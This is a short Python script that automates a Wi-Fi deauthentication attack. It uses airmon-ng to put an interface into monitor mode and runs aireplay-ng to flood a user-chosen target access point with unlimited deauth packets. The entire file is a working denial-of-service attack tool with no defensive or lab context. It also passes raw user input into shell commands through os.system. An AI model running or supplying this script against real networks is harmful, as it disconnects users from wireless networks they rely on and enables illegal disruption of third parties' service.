# wifi_doc_attack.py
import os

def wifi_deauth_attack():
    iface = input("Enter wireless interface (e.g., wlan0): ")
    bssid = input("Enter target BSSID (router MAC): ")
    channel = input("Enter Wi-Fi channel: ")

    print("\n[+] Starting monitor mode...")
    os.system(f"airmon-ng start {iface}")

    print(f"[+] Sending deauth packets to {bssid} on channel {channel}")
    try:
        os.system(f"aireplay-ng --deauth 0 -a {bssid} {iface}mon")
    except KeyboardInterrupt:
        print("Attack stopped.")
    finally:
        print("[+] Stopping monitor mode...")
        os.system(f"airmon-ng stop {iface}mon")
